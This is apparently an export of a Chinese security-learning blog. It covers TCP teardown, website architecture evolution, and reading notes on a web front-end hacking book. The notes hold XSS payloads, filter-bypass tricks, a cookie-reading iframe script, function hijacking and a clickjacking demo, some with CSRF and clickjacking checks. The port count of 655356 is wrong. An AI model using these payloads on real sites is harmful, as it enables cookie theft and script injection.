<p>当浏览器没有要发送的数据时，服务器首先发送一个结束报文，我们称其为执行主动关闭，该报文中fin标志位设置为1，ack标志位设置位1，syn标志位设置位0，同步序列号为x,确认号设置为z,此时服务器关闭其发送数据服务，但仍然可以接受来自浏览器的数据，浏览器接收到后回复服务器一个ack报文，表示已经接收到了服务器的结束连接请求，设置ack标志位为1，syn标志位位0，fin标志位为0，同步序列号为z,此时如果浏览器仍然有请求，仍然可以发送给服务器，等到浏览器没有请求发送后，其会发送一个带有fin+ack标志位的包给服务器，并设置确认号位X，同步序列号位Y表示没有数据再发送给服务器了，进入lask_ack状态，当服务器收到该报文后，发送一个带有ack标记的包给浏览器，同步序列号设置为X，此时服务其进入最终确认状态fn_ack ,待等待了2msl(2倍报文最大生存时间)后，服务器释放连接。</p>
<h2 id="step6：浏览器解析、渲染数据"><a href="#step6：浏览器解析、渲染数据" class="headerlink" title="step6：浏览器解析、渲染数据"></a>step6：浏览器解析、渲染数据</h2><hr>
<p>客户端收到数据后，经过层层的解封装、重组等操作最终将数据发送到浏览器。浏览器接受到数据后首先将html代码构造成DOM树，css文件构造成CSSOM,这两个过程是同步进行，然后浏览器合并这两棵树，生成渲染树，最后进行重构，渲染等操作得到我们看到的网页</p>
<h1 id="QUESTION2：一台计算机最多可以有多少个网络端口（逻辑）？"><a href="#QUESTION2：一台计算机最多可以有多少个网络端口（逻辑）？" class="headerlink" title="QUESTION2：一台计算机最多可以有多少个网络端口（逻辑）？"></a>QUESTION2：一台计算机最多可以有多少个网络端口（逻辑）？</h1><p><strong>共有655356个端口</strong></p>
<ol>
<li>0-1023 公认端口，一般都有特殊的含义，个人在分配端口的时候一般不使用这些端口</li>
<li>1024-49151 注册端口：这些端口可以用于绑定一些服务</li>
<li>49152-65535 私有端口：这些端口我们在测试的过程中可以使用</li>
</ol>
<h1 id="QUESTION3：127-0-0-1在网络安全和测试中的现实意义有哪些？"><a href="#QUESTION3：127-0-0-1在网络安全和测试中的现实意义有哪些？" class="headerlink" title="QUESTION3：127.0.0.1在网络安全和测试中的现实意义有哪些？"></a>QUESTION3：127.0.0.1在网络安全和测试中的现实意义有哪些？</h1><p>一般用作测试用，可以用于测试本机的网络配置是否成功，可以用于本机应用间的通信</p>
<h1 id="QUESTION3：部署网站的体会"><a href="#QUESTION3：部署网站的体会" class="headerlink" title="QUESTION3：部署网站的体会"></a>QUESTION3：部署网站的体会</h1><p>我在部署过程中遇到的一个问题就是PHP版本不匹配的问题，我使用的PHP版本时7.3，这个版本的PHP与老的版本的PHP有较大的差别，就我所知道的，7.3版本里面单条mysql单条查询语句的执行函数时mysqli_query(),而老版本的PHP中确是mysql_qurey，所以我在发布网站之后，访问页面是一片空白。这个问题我在部署sqli_labs的时候也遇到过，不过当时有报错信息，所以我很快就找到了问题的根源，但这次却没有报错信息，所以浪费了很多的时间，还向刘俊岑请教了一下，我方才大彻大悟，可能是PHP版本不兼容导致的， 在我使用了低版本的PHP后，这个问题果然被解决了。</p>
]]></content>
      <categories>
        <category>安全技术</category>
        <category>浏览器</category>
      </categories>
      <tags>
        <tag>浏览器</tag>
      </tags>
  </entry>
  <entry>
    <title>网站架构发展</title>
    <url>/archives/4d872363.html</url>
    <content><![CDATA[<h1 id="网站架构发展"><a href="#网站架构发展" class="headerlink" title="网站架构发展"></a>网站架构发展</h1><h2 id="初始阶段的架构"><a href="#初始阶段的架构" class="headerlink" title="初始阶段的架构"></a>初始阶段的架构</h2><p>最初的架构所有的服务器都在同一台机器上面，没有太多的用户访问，不存在性能瓶颈</p>
<p><img src="/archives/4d872363/Untitled.png"></p>
<h2 id="应用服务器与数据服务的分离"><a href="#应用服务器与数据服务的分离" class="headerlink" title="应用服务器与数据服务的分离"></a>应用服务器与数据服务的分离</h2><p>随着业务的发展，服务器的瓶颈主键暴露了出来，最明显的一个问题就是服务器的存储空间不足，于是乎我们将应用于数据分厘，应用服务器、数据库服务器、文件服务器三者分离</p>
<p><img src="/archives/4d872363/Untitled-1.png"></p>
<h2 id="使用缓存改善网站性能"><a href="#使用缓存改善网站性能" class="headerlink" title="使用缓存改善网站性能"></a>使用缓存改善网站性能</h2><p>业务继续发展，数据库的压力越来越大，顶部业务的访问量占据了整个业务的80%的流量，于是乎便有了缓存服务器技术，将访问量大的数据提前缓存到缓存服务器，提升了服务的速率与质量。</p>
<p><img src="/archives/4d872363/Untitled-2.png"></p>
<h2 id="使用应用服务器集群改善网站的并发处理能力"><a href="#使用应用服务器集群改善网站的并发处理能力" class="headerlink" title="使用应用服务器集群改善网站的并发处理能力"></a>使用应用服务器集群改善网站的并发处理能力</h2><p>单一应用服务器在面对高并发的应用场景有明显的性能瓶颈，于是我们通过应用服务器集群来解决这个问题，通过一个负载均衡服务器来调度资源。</p>
<p><img src="/archives/4d872363/Untitled-3.png"></p>
<h2 id="数据库读写分离"><a href="#数据库读写分离" class="headerlink" title="数据库读写分离"></a>数据库读写分离</h2><p>使用了缓存后，基本解决了数据库读的压力，但随着业务的发展，数据写的压力越来愈大，这时候通过读写分离来解决，通过使用主从数据库服务器来优化数据库的性能，写入操作都到达主服务器，从服务器从主服务器处复制数据，读取操作都到从服务器。</p>
<p><img src="/archives/4d872363/Untitled-4.png"></p>
<h2 id="使用反向代理和-CDN-加速网站响应"><a href="#使用反向代理和-CDN-加速网站响应" class="headerlink" title="使用反向代理和 CDN 加速网站响应"></a>使用反向代理和 CDN 加速网站响应</h2><p>cdn 内容分发网络，通过将用户引流至离用户最近的服务器，减轻中心服务器的压力。通过dns服务器来实现负载均衡。</p>
<p>反向代理 </p>
<p><img src="/archives/4d872363/Untitled-5.png"></p>
<h2 id="使用分布式文件系统和分布式数据库系统"><a href="#使用分布式文件系统和分布式数据库系统" class="headerlink" title="使用分布式文件系统和分布式数据库系统"></a>使用分布式文件系统和分布式数据库系统</h2><p>任何强大的单一服务器都满足不了大型网站持续增长的业务需求。数据库经过读写分离后，从一台服务器拆分成两台服务器，但是随着网站业务的发展依然不能满足需求，这时需要使用分布式数据库。文件系统也一样，需要使用分布式文件系统。</p>
<p><img src="/archives/4d872363/Untitled-6.png"></p>
<p>数据库划分有两种，分别是分割与分层</p>
<p>分层是垂直的，将不同的业务的数据独立存储</p>
<p>分割是水平的，当一个表的数据超过了数据库的性能极限的时候，将其分割成几篇存储到不同的服务器上面</p>
<h2 id="使用-NoSQL-和搜索引擎"><a href="#使用-NoSQL-和搜索引擎" class="headerlink" title="使用 NoSQL 和搜索引擎"></a>使用 NoSQL 和搜索引擎</h2><p>随着网站业务越来越复杂，对数据存储和检索的需求也越来越复杂，网站需要采用一些非关系数据库技术如 NoSQL 和非数据库查询技术如搜索引擎。</p>
<p><img src="/archives/4d872363/Untitled-7.png"></p>
<h2 id="业务拆分"><a href="#业务拆分" class="headerlink" title="业务拆分"></a>业务拆分</h2><p>大型网站为了应对日益复杂的业务场景，通过使用分而治之的手段将整个网站业务分成不同的产品线。如大型购物交易网站都会将首页、商铺、订单、买家、卖家等拆分成不同的产品线，分归不同的业务团队负责。</p>
<p>具体到技术上，也会根据产品线划分，将一个网站拆分成许多不同的应用，每个应用独立部署。应用之间可以通过一个超链接建立关系（在首页上的导航链接每个都指向不同的应用地址），也可以通过消息队列进行数据分发，当然最多的还是通过访问同一个数据存储系统来构成一个关联的完整系统</p>
<p><img src="/archives/4d872363/Untitled-8.png"></p>
<h2 id="分布式服务"><a href="#分布式服务" class="headerlink" title="分布式服务"></a>分布式服务</h2><p>随着业务拆分越来越小，存储系统越来越庞大，应用系统的整体复杂度呈指数级增加，部署维护越来越困难。由于所有应用要和所有数据库系统连接，在数万台服务器规模的网站中，这些连接的数目是服务器规模的平方，导致数据库连接资源不足，拒绝服务。</p>
<p>既然每一个应用系统都需要执行许多相同的业务操作，比如用户管理、商品管理等，那么可以将这些共用的业务提取出来，独立部署。由这些可复用的业务连接数据库，提供共用业务服务，而应用系统只需要管理用户界面，通过分布式服务调用共用业务服务完成具体业务操作。</p>
<p><img src="/archives/4d872363/Untitled-9.png"></p>
]]></content>
      <categories>
        <category>安全技术</category>
        <category>网站</category>
      </categories>
      <tags>
        <tag>网站</tag>
      </tags>
  </entry>
  <entry>
    <title>读书笔记-WEB前端黑客技术揭秘</title>
    <url>/archives/6eecc4bb.html</url>
    <content><![CDATA[<h1 id="读书笔记-WEB前端黑客技术揭秘"><a href="#读书笔记-WEB前端黑客技术揭秘" class="headerlink" title="读书笔记-WEB前端黑客技术揭秘"></a>读书笔记-WEB前端黑客技术揭秘</h1><p>资源：同源策略里面的资源指的是web客户端的资源，包括http消息头，dom树，浏览器存储（cookie\localStorage）</p>
<p>DOM：文档对象模型，就是将html&#x2F;xml这样的文档抽象成一个树形结构，树上的每一个节点都是html&#x2F;xml的标签、标签内容、标签属性</p>
<blockquote>
<p>安全问题很大程度上其实是信任关系<br>iframe中嵌套的网页不能读写父页中的数据，但是可以对父页的<code>location</code> 进行操作，不过只有写权限却没有读权限</p>
</blockquote>
<p>javascript 脚本可以外来引入，也可以在<code>&lt;script&gt;</code> 标签中，也可以在src、href的伪协议中。</p>
<p>通过设置set-cookie的path不能限制cookie被盗用，可以在页面中嵌入一个iframe来获取当前页面的cookie.</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">xc = <span class="keyword">function</span>(<span class="params">src</span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> o=<span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;iframe&quot;</span>);</span><br><span class="line">	o.<span class="property">src</span>=src;</span><br><span class="line">	<span class="variable language_">document</span>.<span class="title function_">getElementByTagName</span>(<span class="string">&quot;body&quot;</span>)[<span class="number">0</span>].<span class="title function_">appendChild</span>(o);</span><br><span class="line">	o.<span class="property">onload</span>=<span class="keyword">function</span>&#123;</span><br><span class="line">	d=o.<span class="property">contentDocument</span> || o.<span class="property">contentWindow</span>.<span class="title function_">document</span>();</span><br><span class="line">	<span class="title function_">alert</span>(d.<span class="property">cookie</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#125;(<span class="string">&quot;http://a.foo.com/admin/index.php&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>cookie设置了httponly之后，客户端的脚本就不能对其进行读写，但是也是可以绕过的，如果服务器的响应洁面含有cookie调试信息，则可能导致cookie泄露，如phpinfo()，Django调式信息</p>
<p>Apache HTTP Server 400 错误会返回http only cookie 。apache http sever 2.2.x多个版本没有严格限制http请求头的内容，当请求头的长度超过<code>limitRequestFieldSize</code>长度时，服务器将会返回400-bad request错误，并在返回的信息中将出错的请求头的内容输出。我们可以利用这一点构造超长的请求头，主动触发400错误获取cookie.</p>
<p>设置了secure的cookie只能通过https协议传输，但却是可读写的。这就意味着，该类型的cookie可被篡改。</p>
<p>修改cookie的时候字段名、path、dmain必须与目标cookie,，不然会被认为是新的cookie，起不到改写的作用</p>
<p>cookie分为本地cookie与内存cookie</p>
<ol>
<li>本地cookie设置了过期时间的cookie被浏览器存储在本地，可被获取与篡改。</li>
<li>内存cookie未设置过期时间的cookie,被浏览器存储咋内存中，可以被加上过期时间，从而存储在本地被读取篡改</li>
</ol>
<p>cookie的p3p性质</p>
<p>该标准规定了是否允许目标网站的cookie是否可以被另一个域通过加载目标网站而被设置与发送，仅ie浏览器执行了该策略。</p>
<p><strong>设置cookie</strong></p>
<p>默认情况写ie时不会允许第三方的域设置cookie的，但如果容器域在响应的时候带上了p3p字段，此时第三方域就可以成功设置cookie。设置后的cookie在id下会自动带上p3p属性，依次生效，即使之后没有p3p头，也有效。</p>
<p><strong>发送cookie</strong></p>
<p>发送的cookie如果是内存cookie，那么无论是否带有p3p属性，都可以正常发送，如果是本地cookie则这个本地cookie必须要有p3p属性，否则即使3目标域响应了p3p头也没用。</p>
<p>大多数浏览器限制每个窗口最多能有50个cookie,最大值约4k</p>
<p>js函数劫持</p>
<p>在目标函数执行前，重写这个函数即可。</p>
<p>下面是eval函数的劫持语句</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">var_eval=<span class="built_in">eval</span>;</span><br><span class="line"><span class="built_in">eval</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_">typeof</span>(x)==<span class="string">&quot;undifined&quot;</span>)&#123;</span><br><span class="line">		<span class="title function_">alert</span>(x);</span><br><span class="line">		<span class="title function_">_eval</span>(x);</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上述脚本的执行结果就是，会先弹窗再正常执行</p>
<p>同样的document.write 与document.writeln可以通过同样的方式劫持</p>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">var_write=<span class="variable language_">document</span>.<span class="property">write</span>.<span class="title function_">bind</span>(<span class="variable language_">document</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">write</span>=<span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_">typeof</span>(x)==<span class="string">&quot;undifined&quot;</span>)&#123;<span class="keyword">return</span>;&#125;</span><br><span class="line">	<span class="title function_">_write</span>(x)</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>操作界面劫持</code>，通过再可见的操作界面元素上伪装一层不可见的iframe以达到劫持的目的。</p>
<p>可分为三种：</p>
<ol>
<li><p><strong>点击劫持:</strong></p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">**file:1**</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">content</span>=<span class="string">&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#click</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">top</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">left</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">z-index</span>: <span class="number">1</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-id">#hidden</span>&#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">120px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">position</span>: absolute;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">filter</span>: <span class="built_in">alpha</span>(opacity=<span class="number">50</span>);</span></span><br><span class="line"><span class="language-css">            <span class="attribute">opacity</span>: <span class="number">0.5</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">z-index</span>: <span class="number">2</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">id</span>=<span class="string">&quot;click&quot;</span> <span class="attr">value</span>=<span class="string">&quot;click me&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;inneriframe.html&quot;</span> <span class="attr">id</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">scrolling</span>=<span class="string">&quot;no&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line">**file2:**</span><br><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span></span></span><br><span class="line"><span class="tag">          <span class="attr">content</span>=<span class="string">&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width: 100px;&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;hello world&#x27;)&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>**拖放劫持：**可在拖放过程中通过dataTransfer兑现的setData与getData函数实现跨域，</p>
</li>
</ol>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line">event.<span class="property">dataTransfer</span>.<span class="title function_">setData</span>(<span class="string">&quot;text&quot;</span>,<span class="string">&quot;someexample&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> text = event.<span class="property">dataTransfer</span>.<span class="title function_">getData</span>(<span class="string">&quot;text&quot;</span>);</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><strong>触屏劫持</strong>：举个例子：将网页伪装成向桌面一样，那么用户就无法分辨到底是不是再桌面上，弹出提示框提示他进行操作从而实现触屏劫持。伪装成桌面需要实现网页全屏与隐藏url地址栏操作</li>
</ol>
<p><strong>CSRF</strong>:如果我们不久前访问过某个网站，但这个网站存在csrf漏洞，那么如果攻击这构造一个虚假的网站，当我们访问该网站的时候，浏览器会认为这是一个合理的请求，那么我们就被成功地攻击了。</p>
<p>防御：校验referer|token ，token值是一个伪随机数，由服务器生成，发送到客户端与窗口绑定，伪造的请求应无法获取该token，故不能成功攻击。</p>
<p><strong>CSRF漏洞确认</strong>：</p>
<ol>
<li>目标表单是否有有效的token随机串</li>
<li>目标表单是否有验证码</li>
<li>目标是否判断了referer来源</li>
<li>网站根目录下crossdomain.xml的allow-access-from domain 是否是通配符</li>
<li>目标json数据是否可以自定义callback函数</li>
</ol>
<p><strong>界面操作劫持确认：</strong></p>
<ol>
<li>目标的http响应头是否设置好了X-Frame-Options字段</li>
<li>目标是否有js的frame Bustin机制</li>
<li>使用iframe签如目标网站测试，若成功，则说明漏洞存在。</li>
</ol>
<p><strong><code>&lt;title&gt;&lt;textarea&gt;&lt;iframe&gt;&lt;noscript&gt;&lt;noframes&gt;&lt;plaintext&gt;&lt;plaintext&gt;中插入js代码不会被解析</code></strong></p>
<p>html标签之间的xss注入，可直接输入script代码</p>
<p>html标签内的xss注入，可通过闭合属性标签或者直接闭合标签两种方式实现。</p>
<p>对于隐藏的表单，一般通过闭合属性成功率更高，应为，再标签间的注入使用了&lt;&gt;，而这两个符号一遍会被网站的安全措施过滤掉或者编码。还有就是，如果再input标签中，type字段在我们的输入点之后，我们可以通过在payload中重新定义type为text，如type&#x3D;”text”，这样就得到了一个寻常的输入框。</p>
<p>**js伪协议：**javascript:后面的内容会被当作js代码来执行，如果存在多条语句，需要用分号分割，且最后一条语句的执行结果会被输出在页面上，如果不想起输入在页面上，则使用一句void 0；来进行屏蔽</p>
<p><strong>data协议</strong>： data:text&#x2F;javascript;base64,base64编码后的js代码</p>
<p>**expression:**在style属性或者样式表文件中使用expression可以执行js代码，只对<code>IE浏览器</code>生效</p>
<p><code>1；xss:expression(if(!window.x&#123;alert(1);window.x=1;&#125;))</code>  避免ie陷入死循环</p>
<p>html代码中属性的值可以通过没有引号、单引号、双引号、反单引号（ie浏览器）,故在探测的时候，应注意判断属性值的闭合方式。</p>
<p>输入的值若被js处理，我们可以通过闭合js代码的方式来插入我们需要的代码。如</p>
<p><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;//</code>  #闭合标签</p>
<p>或者</p>
<p><code>&quot;;alert(1111)//(注释掉后面的那内容)</code> #直接闭合代码</p>
<p>如果<code>注释符号//被过滤了</code>可以通过使用算数运算符或者逻辑运算符的方式绕过，因为js是一门弱类型的语言，所以字符间的运算时可以的</p>
<p><strong><code>&lt;title&gt;&lt;textarea&gt;&lt;iframe&gt;&lt;noscript&gt;&lt;noframes&gt;&lt;xmp&gt;标签中的内容会被html编码，但&lt;plaintxt&gt;标签在firefox中不会被编码，但在chrome中会被编码，这可能导致在firefox中出现安全问题</code></strong> </p>
<p>使用webkit内核的浏览器，获取textarea标签的innerHTML值的时候，内容不会被编码。</p>
<p>在PHP中通过$_SERVER[‘qurey_string’]方法获取的查询字符串是urlencode编码后的字符串，而通过$_GET[‘quret_string’]方法获取的查询字符串是urlencode编码前的字符串。</p>
<p>不同浏览器针对特殊字符的url编码策略不一致导致可能存在安全漏洞</p>
<p>firefox:编码了’”&lt;&gt;&#96;</p>
<p>chrome:编码了&lt;&gt;</p>
<p>IE：不做任何编码</p>
<p>这导致如果服务端针对url中用户的输入部分不做任何过滤，那么IE浏览器中将出现漏洞，chorme中会出现一些漏洞，firefox相对较安全。</p>
<p>在chorme浏览器中，#后的所有内容都不会被编码，故通过该方法我们可以在chorme下触发DOMXSS攻击。（实际上会被chorme的xss filter拦截掉，我们需要突破这层拦截）</p>
<p>DOM的修正式渲染，浏览器会在渲染dom树的时候对html内容进行修正，也叫DOM重构，DOM重构分为静态重构与动态重构，其差别在于有没有js的参与，修正包括下面的内容：标签正确闭合、属性正确闭合。</p>
<h3 id="字符与字符集导致的安全问题"><a href="#字符与字符集导致的安全问题" class="headerlink" title="字符与字符集导致的安全问题"></a>字符与字符集导致的安全问题</h3><p><strong>宽字节编码问题</strong></p>
<p>如果网页的编码方式时GBK\GB2312等宽字节编码则可能存在宽字节绕过风险</p>
<p>在PHP中如果开启了<code>magic_quotes_gpc=on</code>的话则可能触发宽字节注入。且该功能是默认开启的，如果没有关闭该功能则存在风险。</p>
<p>GBK的编码是分为高字节与低字节两个部分的，如果在一个低字节钱前面出现了一个合法的高字节的话，这两个字节则会被认为表示一个字符，从而实现绕过。这里就体现出了magic_quotes_gpc开启的关键所在了。当该功能被开启时，输入的字符’”\等默认会被转义，也就是在前面添加一个\，该斜线的十六进制表示为0x5c，刚好出现在了GBK的低字节区域，那么如果其前面出现一个合理的高字节的话，这连个字节就会被认为表示一个字符，从而绕开转义实现突破。GB2312是被GBK兼容的，但\在GB2312的编码中并没有出现在其合理的低字节区域内部，按理说是不存在问题的，但浏览器在解析的时候，是将GB2312按照GBK的方式来进行解析的，这样同样会出现问题。</p>
<p><strong>UTF7导致的问题</strong></p>
<p>当前只有IE还支持对UTF7的解析</p>
<p>在ie6\7时代如果http的响应头中没有指定字符集编码方式或者声明错误，同时在meta未指定charset或指定错误，那么浏览器会判断响应内容中是否出现UTF7编码的字符串，如果存在，当前页面将会按照UTF7的方式进行解码。</p>
<p>可以通过<link>标签来引入外域的utf7编码的css文件，在css文件中通过<code>expression</code>来执行js代码</p>
<p><strong>BOM(标记字节顺序码byte order mark),只</strong>出现在unicode字符集中，bom出现在文件的开始文职，软件通过判断bom来判断他的unicode字符集的编码方式，如果发现了+&#x2F;v8这样的字符，那么则以utf7的方式来解析网页，从而绕过过滤机制。在实践中，能够控制网页开头部分的功能为：用户自定义的css样式温江，jsoncallback类型的来连接，出现在web2.0中。防御这类的攻击最有效的方式是强制在文件的开头加上一个空格。</p>
<p><strong>绕过XSS Filter</strong></p>
<p>响应头<code>CRLF</code>注入绕过</p>
<p><code>CRLF,即回车换行符</code>，在windows表示新的一行，回车，即在同一行但回到行首，换行，上移一行但水平位置不变。</p>
<p>如果网页存在CRLF注入，在HTTP协议中注入回车换行符（%0d%0a）就可以注入头部，因为url只有第一行是头部，换行回车后的内容会被当成响应内容响应回来。可以通过这种方式注入<code>X-XSS-Protection:0</code> 来关闭XSS Filter</p>
<p>同域白名单</p>
<p>iE浏览器通过referer判断是否来自同域，如果是则xss filter不生效。可通过嵌入<code>&lt;a&gt;</code>标签或者<code>&lt;iframe&gt;</code>标签来达到同域的目的</p>
<p>chrome浏览器如果是通过<code>&lt;script&gt;</code>嵌入的同域内的<code>js</code>文件，<code>XSS</code> Filter则完全不会工作。</p>
<p>场景依赖性高的绕过</p>
<p>如果输入内容直接出现在js代码中，这样XSSfilter就无法防御。</p>
<p>如果php开启了GPC功能，那么可以给通过在payload中插入%00来在IE中实现绕过。因为%00会被转换为\0</p>
<h3 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h3><p><strong>进制常识</strong></p>
<p>html代码中可以识别<code>十进制与十六进制</code>两种，通过&#12; 表示十进制，&amp;#x2f表示十六进制。</p>
<p>css中能够兼容html代码的进制表示方式，css中可以使用\6c这样的1x6进制表示方式。编码的时候注意要将css属性的：留出来不能编码，否则不能正确解析。</p>
<p>js中能过够直接执行带有<code>八进制与十六进制</code>的两种编码方式。这两种进制可以直接被js代码识别并执行，八进制用\23表示 十六进制用\x2e表示。这两种方式只能给单字节编码也就是ascii码，如果出现了多字节编码，则需要通过16进制来表示。\u2345。十进制虽然不能直接执行，但可以通过<code>String.fromCharCode(code,jinzhi)</code>来解码，然后再交给eval函数执行。</p>
<p>十进制的数字可以指定位数，不足的通过0来补齐，如&#1234; &#0024; 这种。<code>这种特性可以利用来绕过过滤策略</code> 当然，位数有时候还受到浏览器本身的限制。</p>
<p><strong>JS加解密</strong></p>
<p>js提供了三对编解码函数</p>
<ol>
<li>escape|unescape</li>
<li>encodeURI|decodeURI</li>
<li>encodeURIComponent|decodeURIComponent</li>
</ol>
<p>上述三个函数不编码的字符从上到下依次减少，所以使用第3个相对比较安全</p>
<p><strong>HTML中的代码注入技巧</strong></p>
<p><strong>标签中的注入</strong></p>
<ol>
<li><p>HTML代码不区分大小写，可以通过大小写来实现混淆</p>
</li>
<li><p>HTML标签存在优先级的问题，甚至有的优先级高的标签可以截断其他的标签，从而瞒过过滤器。如<code>&lt;style&gt;&lt;title&gt;</code>标签</p>
<ol>
<li><p><code>&lt;title&gt;&lt;a href=&quot;&lt;title&gt;&lt;img src=x onerror=alert(1111)&gt;//&quot;&gt;</code> #过滤器认为是一个title标签加一个a标签，浏览器认为是一对title标签加一个img标签。</p>
</li>
<li><p>如果上述标签被过滤了可以尝试使用如下方式</p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1. &lt;? foo=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1111)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;</span><br><span class="line">2. &lt;! foo=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1111)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;</span><br><span class="line">3. &lt;/  foo=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1111)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&gt;# 前三种再firefox和webkit内核中有效</span><br><span class="line">4. &lt;% foo=&quot;%&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1111)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&gt; #IE中有效</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>可以再HTML代码中插入xml代码、svg代码、和未知标签来瞒过过滤器</p>
<ol>
<li><code>&lt;xss style=&quot;xss:expression(alert(1111))&quot;&gt;</code> #通过该方式再IE中执行插入的代码，可以瞒过过滤器</li>
</ol>
</li>
<li><p>使用少见的标签绕过过滤器</p>
